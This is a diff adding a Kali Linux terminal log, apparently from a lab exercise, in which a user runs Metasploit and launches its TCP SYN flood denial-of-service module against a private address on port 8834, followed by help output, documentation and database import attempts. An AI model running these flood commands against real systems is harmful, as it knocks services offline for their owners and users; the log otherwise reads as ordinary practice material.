@@ -1,0 +1,355 @@
+──(root㉿kali)-[~]
+└─# ifconfig eth0 down
+                                                                             
+┌──(root㉿kali)-[~]
+└─# sudo ifconfig eth0 down     
+                                                                             
+┌──(root㉿kali)-[~]
+└─# sudo ifconfig eth0 up  
+                                                                             
+┌──(root㉿kali)-[~]
+└─# sudo -i              
+┌──(root㉿kali)-[~]
+└─# msfconsole
+\
+To use retry middleware with Faraday v2.0+, install `faraday-retry` gem
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.2.1-dev                           ]
++ -- --=[ 2225 exploits - 1171 auxiliary - 398 post       ]
++ -- --=[ 864 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View a module's description using 
+info, or the enhanced version in your browser with 
+info -d
+
+msf6 > \
+msf6 > exploit
+[-] Unknown command: exploit
+msf6 > connect 10.0.2.15
+Usage: connect [options] <host> <port>
+
+Communicate with a host, similar to interacting via netcat, taking advantage of
+any configured session pivoting.
+
+OPTIONS:
+
+    -c, --comm <comm>               Specify which Comm to use.
+    -C, --crlf                      Try to use CRLF for EOL sequence.
+    -h, --help                      Help banner.
+    -i, --send-contents <file>      Send the contents of a file.
+    -p, --proxies <proxies>         List of proxies to use.
+    -P, --source-port <port>        Specify source port.
+    -S, --source-address <address>  Specify source address.
+    -s, --ssl                       Connect with SSL.
+    -u, --udp                       Switch to a UDP socket.
+    -w, --timeout <seconds>         Specify connect timeout.
+    -z, --try-connection            Just try to connect, then return.
+msf6 > connect -z 10.0.2.15 8834
+[*] Connected to 10.0.2.15:8834 (via: 10.0.2.15:40447)
+msf6 > use  auxiliry/dos/tcp/synflood
+[-] No results from search
+[-] Failed to load module: auxiliry/dos/tcp/synflood
+msf6 > use auxiliary/dos/tcp/synflood
+msf6 auxiliary(dos/tcp/synflood) > use auxiliary/dos/tcp/synflood
+msf6 auxiliary(dos/tcp/synflood) > set RHOSTS 10.0.2.15
+RHOSTS => 10.0.2.15
+msf6 auxiliary(dos/tcp/synflood) > set RPORT 8834
+RPORT => 8834
+msf6 auxiliary(dos/tcp/synflood) > exploit
+[*] Running module against 10.0.2.15
+
+[*] SYN flooding 10.0.2.15:8834...
+^C[-] Stopping running against current target...
+[*] Control-C again to force quit all targets.
+[*] Auxiliary module execution completed
+msf6 auxiliary(dos/tcp/synflood) > help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    debug         Display information useful for debugging
+    exit          Exit the console
+    features      Display the list of not yet released features that can be
+                   opted in to
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessi
+                  ons
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    clearm        Clear the module stack
+    favorite      Add module(s) to the list of favorite modules
+    info          Displays information about one or more modules
+    listm         List the module stack
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stac
+                  k
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    jobs          Displays and manages jobs
+    kill          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a file
+    resource      Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address
+                       or address range
+    db_connect        Connect to an existing data service
+    db_disconnect     Disconnect from the current data service
+    db_export         Export a file containing the contents of the database
+    db_import         Import a scan result file (filetype will be auto-dete
+                      cted)
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated
+                      )
+    db_remove         Remove the saved data service entry
+    db_save           Save the current data service connection as the defau
+                      lt to reconnect on startup
+    db_status         Show the current data service status
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+
+
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    edit          Edit the current module or a file with the preferred edit
+                  or
+    irb           Open an interactive Ruby shell in the current context
+    log           Display framework.log paged to the end if possible
+    pry           Open the Pry debugger on the current module or Framework
+    reload_lib    Reload Ruby library files from specified paths
+    time          Time how long it takes to run a particular command
+
+
+Auxiliary Commands
+==================
+
+    Command       Description
+    -------       -----------
+    check         Check to see if a target is vulnerable
+    exploit       This is an alias for the run command
+    rcheck        Reloads the module and checks if the target is vulnerable
+    recheck       This is an alias for the rcheck command
+    reload        Reloads the auxiliary module
+    rerun         Reloads and launches the auxiliary module
+    rexploit      This is an alias for the rerun command
+    run           Launches the auxiliary module
+
+
+msfconsole
+==========
+
+`msfconsole` is the primary interface to Metasploit Framework. There is quite a
+lot that needs go here, please be patient and keep an eye on this space!
+
+Building ranges and lists
+-------------------------
+
+Many commands and options that take a list of things can use ranges to avoid
+having to manually list each desired thing. All ranges are inclusive.
+
+### Ranges of IDs
+
+Commands that take a list of IDs can use ranges to help. Individual IDs must be
+separated by a `,` (no space allowed) and ranges can be expressed with either
+`-` or `..`.
+
+### Ranges of IPs
+
+There are several ways to specify ranges of IP addresses that can be mixed
+together. The first way is a list of IPs separated by just a ` ` (ASCII space),
+with an optional `,`. The next way is two complete IP addresses in the form of
+`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
+specifications may also be used, however the whole address must be given to
+Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
+Additionally, a netmask can be used in conjunction with a domain name to
+dynamically resolve which block to target. All these methods work for both IPv4
+and IPv6 addresses. IPv4 addresses can also be specified with special octet
+ranges from the [NMAP target
+specification](https://nmap.org/book/man-target-specification.html)
+
+### Examples
+
+Terminate the first sessions:
+
+    sessions -k 1
+
+Stop some extra running jobs:
+
+    jobs -k 2-6,7,8,11..15
+
+Check a set of IP addresses:
+
+    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
+
+Target a set of IPv6 hosts:
+
+    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
+
+Target a block from a resolved domain name:
+
+    set RHOSTS www.example.test/24
+msf6 auxiliary(dos/tcp/synflood) > db import
+[-] Unknown command: db
+msf6 auxiliary(dos/tcp/synflood) > db_import
+Usage: db_import <filename> [file2...]
+
+Filenames can be globs like *.xml, or **/*.xml which will search recursively
+Currently supported file types include:
+    Acunetix
+    Amap Log
+    Amap Log -m
+    Appscan
+    Burp Session XML
+    Burp Issue XML
+    CI
+    Foundstone
+    FusionVM XML
+    Group Policy Preferences Credentials
+    IP Address List
+    IP360 ASPL
+    IP360 XML v3
+    Libpcap Packet Capture
+    Masscan XML
+    Metasploit PWDump Export
+    Metasploit XML
+    Metasploit Zip Export
+    Microsoft Baseline Security Analyzer
+    NeXpose Simple XML
+    NeXpose XML Report
+    Nessus NBE Report
+    Nessus XML (v1)
+    Nessus XML (v2)
+    NetSparker XML
+    Nikto XML
+    Nmap XML
+    OpenVAS Report
+    OpenVAS XML
+    Outpost24 XML
+    Qualys Asset XML
+    Qualys Scan XML
+    Retina XML
+    Spiceworks CSV Export
+    Wapiti XML
+
+msf6 auxiliary(dos/tcp/synflood) > db_import Metasploit Zip Export
+[-] No such file Metasploit
+[-] No such file Zip
+[-] No such file Export
+msf6 auxiliary(dos/tcp/synflood) > db_import DOS1
+[-] No such file DOS1
+msf6 auxiliary(dos/tcp/synflood) > db_import DOS1.txt
+[-] No such file DOS1.txt
+msf6 auxiliary(dos/tcp/synflood) > db_export Dos1.txt
+[*] Starting export of workspace default to Dos1.txt [ xml ]...
+[*] Finished export of workspace default to Dos1.txt [ xml ]...
+msf6 auxiliary(dos/tcp/synflood) > 
+                                                                                                
+                                                                                                
+                                            
